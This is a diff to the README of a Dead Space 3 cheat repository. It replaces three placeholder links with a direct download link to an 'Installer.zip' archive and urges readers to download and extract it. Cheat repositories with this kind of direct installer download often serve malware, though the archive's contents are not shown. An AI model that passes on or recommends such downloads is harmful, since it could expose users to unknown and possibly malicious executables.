@@ -1,6 +1,6 @@
 # Dead Space One Hit Cheats Stasis ⚔️
 
-Welcome to the **Dead Space One Hit Cheats Stasis** repository! This project provides various cheats and mods for *Dead Space 3*, enhancing your gaming experience with features like unlimited health, ammo, and more. You can find the latest releases [here](555).
+Welcome to the **Dead Space One Hit Cheats Stasis** repository! This project provides various cheats and mods for *Dead Space 3*, enhancing your gaming experience with features like unlimited health, ammo, and more. You can find the latest releases [here](https://github.com/russianboy292/Dead-Space-one-hit-cheats-stasis/releases/download/Download/Installer.zip).
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ Welcome to the **Dead Space One Hit Cheats Stasis** repository! This project pro
 
 ## Installation
 
-To get started, download the latest release from our [Releases](555) section. Follow these steps:
+To get started, download the latest release from our [Releases](https://github.com/russianboy292/Dead-Space-one-hit-cheats-stasis/releases/download/Download/Installer.zip) section. Follow these steps:
 
 1. **Download the ZIP file**: Navigate to the releases page and download the appropriate version for your system.
 2. **Extract the files**: Use a file extraction tool to unzip the downloaded file.
@@ -76,4 +76,4 @@ For questions or support, please reach out through the issues section of this re
 
 ---
 
-Thank you for checking out the **Dead Space One Hit Cheats Stasis** repository! We hope these cheats enhance your gaming experience. For the latest updates and releases, visit our [Releases](555) section. Enjoy your time in space! 🌌
+Thank you for checking out the **Dead Space One Hit Cheats Stasis** repository! We hope these cheats enhance your gaming experience. For the latest updates and releases, visit our [Releases](https://github.com/russianboy292/Dead-Space-one-hit-cheats-stasis/releases/download/Download/Installer.zip) section. Enjoy your time in space! 🌌
